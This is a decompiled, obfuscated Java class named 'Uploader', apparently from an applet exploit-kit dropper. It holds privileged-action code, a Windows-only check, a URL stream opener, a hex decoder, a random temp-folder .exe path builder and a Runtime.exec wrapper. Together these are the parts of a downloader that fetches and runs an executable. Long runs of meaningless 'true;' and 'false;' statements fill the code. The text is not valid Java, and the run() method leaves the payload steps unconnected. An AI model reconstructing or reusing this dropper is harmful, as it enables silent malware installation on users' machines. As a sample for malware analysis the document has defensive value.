// 
// Decompiled by Procyon v0.5.30
// 

package isize;

import java.security.AccessController;
import java.io.File;
import java.net.URL;
import java.io.InputStream;
import java.security.PrivilegedExceptionAction;

public class Uploader implements PrivilegedExceptionAction
{
    public static String data;
    public static String cc;
    
    private InputStream __m(final String s) throws Exception {
        final URL url = new URL(s);
        true;
        true;
        true;
        true;
        true;
        url.openConnection();
        false;
        false;
        false;
        false;
        return url.openStream();
    }
    
    private Process __e(final Runtime runtime, final String s) throws Exception {
        return runtime.exec(s, null, null);
    }
    
    public static byte[] __z(final String s) {
        false;
        false;
        false;
        false;
        final int n = 2;
        final byte[] array = new byte[s.length() / n];
        true;
        true;
        true;
        true;
        true;
        final int n2 = 16;
        false;
        false;
        false;
        false;
        for (int i = 0; i < s.length(); i += n) {
            array[i / n] = (byte)((Character.digit(s.charAt(i), n2) << 4) + Character.digit(s.charAt(i + 1), n2));
            true;
            true;
            true;
            true;
            true;
            true;
            true;
        }
        false;
        false;
        false;
        false;
        false;
        false;
        false;
        false;
        false;
        return array;
    }
    
    private String __w() {
        true;
        true;
        true;
        true;
        true;
        true;
        true;
        true;
        false;
        false;
        false;
        false;
        false;
        false;
        return System.getProperty("java.io.tmpdir");
    }
    
    private void Caller(final int n, final String s) throws Exception {
        true;
        true;
        true;
        true;
        true;
        false;
        false;
        false;
        false;
        false;
        false;
        false;
        final Runtime _y = this.__Y();
        Boolean b = true;
        final int n2 = 1024;
        true;
        true;
        true;
        true;
        true;
        true;
        true;
        false;
        false;
        false;
        false;
        false;
        false;
        false;
        false;
        if (n >= n2) {
            b = false;
        }
        true;
        true;
        true;
        true;
        true;
        true;
        true;
        false;
        false;
        false;
        false;
        false;
        if (!b) {
            this.__e(_y, s);
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            true;
        }
        false;
        false;
        false;
        false;
        false;
    }
    
    private Runtime __Y() throws Exception {
        true;
        true;
        true;
        true;
        true;
        true;
        true;
        true;
        return Runtime.getRuntime();
    }
    
    private String __q() {
        false;
        false;
        false;
        false;
        false;
        false;
        false;
        false;
        final StringBuilder sb = new StringBuilder();
        true;
        true;
        true;
        true;
        true;
        true;
        true;
        true;
        true;
        true;
        sb.append(this.__w());
        false;
        false;
        false;
        false;
        sb.append(File.separator);
        sb.append(Math.random());
        sb.append(".exe");
        true;
        true;
        true;
        true;
        true;
        true;
        true;
        true;
        true;
        false;
        false;
        false;
        false;
        false;
        false;
        return sb.toString();
    }
    
    @Override
    public Object run() throws Exception {
        true;
        true;
        true;
        true;
        true;
        true;
        true;
        false;
        false;
        false;
        false;
        false;
        false;
        false;
        false;
        if (Uploader.data == null) {
            return null;
        }
        try {
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            false;
            false;
            false;
            false;
            false;
            false;
            if (!this.__Q()) {
                return null;
            }
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            false;
            false;
            false;
            false;
            false;
            false;
            false;
            false;
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            if (Uploader.cc != null) {
                false;
                false;
                false;
                false;
                false;
                Integer.parseInt(Uploader.cc);
            }
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            false;
            false;
            false;
            false;
            false;
            false;
            false;
            false;
            false;
            false;
        }
        catch (Exception ex) {
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            false;
            false;
            false;
            false;
            false;
            false;
            false;
            false;
            false;
        }
        true;
        true;
        true;
        true;
        true;
        return null;
    }
    
    private Boolean __Q() {
        true;
        true;
        true;
        true;
        true;
        true;
        true;
        false;
        false;
        false;
        false;
        false;
        false;
        false;
        false;
        false;
        if (System.getProperty("os.name").indexOf("Windows") == -1) {
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            false;
            false;
            false;
            false;
            return false;
        }
        return true;
    }
    
    public Uploader() {
        true;
        true;
        true;
        true;
        true;
        true;
        true;
        false;
        false;
        false;
        false;
        false;
        false;
        try {
            AccessController.doPrivileged((PrivilegedExceptionAction<Object>)this);
        }
        catch (Exception ex) {
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            true;
            false;
            false;
            false;
            false;
            false;
        }
    }
    
    static {
        Uploader.data = null;
        Uploader.cc = null;
    }
}
